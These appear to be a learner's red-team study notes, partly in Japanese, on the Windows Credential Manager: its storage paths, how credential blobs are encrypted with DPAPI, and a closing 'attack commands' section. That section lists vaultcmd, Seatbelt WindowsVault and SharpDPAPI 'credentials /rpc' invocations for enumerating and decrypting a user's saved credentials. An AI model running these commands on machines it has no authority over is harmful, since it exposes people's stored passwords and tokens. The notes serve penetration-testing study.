The Windows Credential Manager stores other credentials that the user has asked Windows to save, such as those for Remote Desktop connections.

The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers
### Windows Vault/ Credential Locker
Credential Mangerには2つのストレージ
- Windows Credentials
	- Path : `%APPDATA%\Microsoft\Credentials\`
	- Path : `%LOCALAPPDATA%\Microsoft\Credentials\`
- Web Credentials ( ほぼ使われてない)
	- Path : `%LOCALAPPDATA%\Microsoft\Vault\4C8DBC14-2DC6-401F-94A2-...\{GUID}\`

暗号化のプロセス
- credential blobの暗号化は「ランダムAESキー（session key）で資格情報を暗号化 → そのAESキーをMaster Keyで暗号化 → blobに両方入れる」

## 攻撃コマンド
native vault command
```
run vaultcmd /listcreds:"Windows Credentials" /all
```

Seatbelt's WindowsVault command
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

The `credentials` command will search through the saved credentials blobs for the current user, and attempts to decrypt them.
```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```